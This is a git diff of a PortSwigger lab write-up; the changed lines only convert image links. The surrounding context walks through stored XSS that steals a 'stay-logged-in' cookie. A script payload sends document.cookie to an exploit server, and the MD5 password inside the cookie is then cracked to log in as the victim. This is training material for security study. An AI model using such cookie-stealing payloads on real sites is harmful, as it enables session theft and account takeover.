@@ -11,7 +11,7 @@
 
 > See that the `GET` request to fetch the user has a cookie called `stay-logged-in`.
 
-![[Pasted image 20230702175008.png]]
+![](Pasted-image-20230702175008.png)
 
 > Similar to [[Portswigger/Authentication/Lab 10|Lab 10]], this cookie is constructed as the base64 encoding of the username + ':' + MD5Hash(password).
 ```
@@ -58,7 +58,7 @@ base64(username:MD5(password))
 <script>alert()</script>
 ```
 
-![[Pasted image 20230702175307.png]]
+![](Pasted-image-20230702175307.png)
 
 > Posting the comment and visiting the page again pops up the alert.
 > Trying to display the cookie using the alert.
@@ -66,7 +66,7 @@ base64(username:MD5(password))
 <script>alert(document.cookie)</script>
 ```
 
-![[Pasted image 20230702175741.png]]
+![](Pasted-image-20230702175741.png)
 
 > This displays the same cookie as the one in the GET and POST requests.
 > This is now a stored XSS attack, but we need that to work for the user carlos.
@@ -78,7 +78,7 @@ base64(username:MD5(password))
 <script>document.location='exploit-server-url'+document.cookie</script>
 ```
 
-![[Pasted image 20230702180219.png]]
+![](Pasted-image-20230702180219.png)
 
 > Filling in the URL:
 ```
@@ -86,7 +86,7 @@ base64(username:MD5(password))
 ```
 > Adding this payload as a comment on one of the posts then checking the exploit server logs.
 
-![[Pasted image 20230702180524.png]]
+![](Pasted-image-20230702180524.png)
 
 > We see the same IP address and that one has the stay logged in cookie as the one we used for weiner.
 > However, the before last line contains a different IP address with a different value for the stay logged in cookie.
@@ -109,7 +109,7 @@ john --format=raw-md5 hash
 
 > Took too long, so I went to this [website](https://md5decrypt.net/en/) to complete it faster.
 
-![[Pasted image 20230702181224.png]]
+![](Pasted-image-20230702181224.png)
 
 > Revealing the password as `onceuponatime`.
 > Loggin in as carlos and deleting the account completes the lab.
